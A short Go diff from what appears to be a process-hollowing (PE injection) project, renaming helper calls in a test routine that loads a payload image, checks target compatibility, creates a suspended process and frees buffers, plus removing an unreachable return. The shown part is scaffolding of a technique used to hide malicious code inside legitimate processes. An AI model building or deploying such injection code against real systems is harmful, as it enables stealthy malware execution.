@@ -40,23 +40,23 @@ func testGoSeparated() bool {
 
 	// 2. Prepare the taget
 	//Test is_target_compatible
-	isTargComp := IsTargetCompatible(loadedPE, payloadImageSize, targetPath)
+	isTargComp := gIsTargetCompatible(loadedPE, payloadImageSize, targetPath)
 	fmt.Println("Is Target Compatible in GO: ", isTargComp)
 
 	if !isTargComp {
-		FreePEBuffer(loadedPE, payloadImageSize)
+		gFreePEBuffer(loadedPE, payloadImageSize)
 		return false
 	}
 
 	// Create the target process (suspended):
 	//Test create_suspended_process
 	var pi syscall.ProcessInformation
-	isCreated := CreateSuspendedProcess(targetPath, &pi)
+	isCreated := gCreateSuspendedProcess(targetPath, &pi)
 	fmt.Printf("Suspended process created in GO: %t ProcessID: %d\n", isCreated, pi.ProcessId)
 
 	if !isCreated {
 		log.Println("Creating target process failed!")
-		FreePEBuffer(loadedPE, payloadImageSize)
+		gFreePEBuffer(loadedPE, payloadImageSize)
 		return false
 	}
 
@@ -71,14 +71,12 @@ func testGoSeparated() bool {
 		TerminateProcess(pi.ProcessId)
 	}
 	//Test free_pe_buffer
-	isFree := FreePEBuffer(loadedPE, payloadImageSize)
+	isFree := gFreePEBuffer(loadedPE, payloadImageSize)
 	fmt.Println("Is buffer free in GO: ", isFree)
 	syscall.CloseHandle(pi.Thread)
 	syscall.CloseHandle(pi.Process)
 	//---
 	return isOK
-
-	return true
 }
 
 //Main func of injection
